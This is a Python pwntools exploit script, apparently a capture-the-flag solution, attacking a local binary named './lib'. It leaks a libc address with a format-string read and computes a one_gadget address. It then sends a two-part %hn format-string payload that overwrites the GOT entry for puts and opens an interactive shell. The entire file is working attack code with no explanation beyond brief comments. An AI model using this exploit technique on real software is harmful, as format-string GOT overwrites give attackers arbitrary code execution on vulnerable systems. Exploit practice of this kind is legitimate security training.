#!/usr/bin/python3
from pwn import *

exe = "./lib"

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
    b* main+194
'''.format(**locals())

#====================================
#|         EXPLOIT GOES HERE        |
#====================================

gotputs = 0x601018
p = start()
context.log_level = 'DEBUG'
p.recvlines(2)
# getting leaks to libc + changing canary value
p.sendline(b"%3$p")
p.recvuntil("there ")
# recieving leaks
leek = p.recvline()[:-1:]
libbase = int(leek,16) - 0x114a37
one_gadget = libbase + 0xebcf5
# processing stuff
lh = int(hex(one_gadget)[-8::],16)
llh = int(hex(one_gadget)[-8:-4:],16)
lrh = int(hex(one_gadget)[-4::],16)
stuff = llh - lrh
spuff = lrh - llh
p.recvline()
# setting up conditionals for when each halves are greater within the partial overwrite
# need to setup a better way to do this
if (stuff >0):
    payload = (f"%{lrh}c%20$hn%{stuff}c%21$hn".ljust(32, '\x00')).encode() + p64(gotputs) + p64(gotputs+0x2)
else:
    payload = (f"%{llh}c%20$hn%{spuff}c%21$hn".ljust(32, '\x00')).encode() + p64(gotputs) + p64(gotputs+0x2)
p.sendline(payload)
p.interactive()